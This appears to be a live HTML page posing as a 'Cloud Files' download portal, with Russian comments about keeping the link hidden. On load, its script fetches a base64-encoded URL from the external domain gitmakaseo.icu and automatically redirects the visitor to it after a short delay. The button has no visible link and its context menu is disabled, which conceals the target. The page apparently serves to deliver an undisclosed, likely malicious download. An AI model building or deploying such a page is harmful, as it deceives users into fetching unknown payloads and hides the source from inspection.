<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Cloud Files</title>
  <meta name="description" content="Simple download portal"/>
  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>

  <!-- CSP: инлайн-скрипт и запрос к Site B (ваш манифест) -->
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    style-src   'self';
    script-src  'self' 'unsafe-inline';
    connect-src 'self' https://gitmakaseo.icu;
  ">

  <link rel="stylesheet" href="styles.css"/>
</head>
<body>
  <div class="pf-wrap">
    <div class="pf-card">
      <div class="pf-badge" aria-hidden="true">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
          <path d="M8 11L12 15L16 11"
                stroke="white" stroke-width="2"
                stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>

      <h1>Preparing your download…</h1>

      <div class="pf-loader" aria-hidden="true">
        <div class="pf-spinner"></div>
        <div class="pf-bar">
          <div class="pf-bar-fill"></div>
        </div>
      </div>

      <p id="pf-status" class="pf-status" aria-live="polite">Fetching link…</p>
      <p id="pf-error"  class="pf-error"  role="alert"></p>

      <!-- Кнопка без href (ссылка нигде не светится) -->
      <button id="pf-btn" class="pf-btn" type="button" disabled>
        Download now
      </button>
    </div>
  </div>

  <script>
  (function(){
    const SETTINGS_URL = 'https://gitmakaseo.icu/vega.mfksp23s';

    const st   = document.getElementById('pf-status');
    const err  = document.getElementById('pf-error');
    const btn  = document.getElementById('pf-btn');
    const spinner = document.querySelector('.pf-spinner');
    const barFill = document.querySelector('.pf-bar-fill');

    let downloadUrl = null;

    // 1) Тянем конфиг и запускаем авто-редирект
    (async () => {
      st.textContent = 'Fetching link…';
      err.textContent = '';

      try {
        const r = await fetch(SETTINGS_URL, { cache: 'no-store' });
        if (!r.ok) throw new Error('Config HTTP ' + r.status);

        const { c } = await r.json();
        if (!c) throw new Error('Missing config value');

        const url = atob(c);
        if (!/^https?:\/\//i.test(url)) throw new Error('Invalid URL');

        downloadUrl = url;
        btn.disabled = false;                 // включаем дубль-кнопку
        st.textContent = 'Downloading…';

        // Небольшая задержка ради UX → авто-редирект
        setTimeout(() => { window.location.href = downloadUrl; }, 700);

      } catch (e) {
        console.error(e);
        st.textContent = '';
        err.textContent = 'Error: ' + e.message;
        spinner?.classList.add('pf-spinner-paused');
        barFill?.classList.add('pf-bar-paused');
      }
    })();

    // 2) Ручной запуск по кнопке (URL не «светится»)
    btn.addEventListener('click', () => {
      if (!downloadUrl) return;
      st.textContent = 'Downloading…';
      setTimeout(() => { window.location.href = downloadUrl; }, 150);
    }, { passive: true });

    // Без контекстного меню/выделений
    btn.addEventListener('contextmenu', e => e.preventDefault());
  })();
  </script>
</body>
</html>
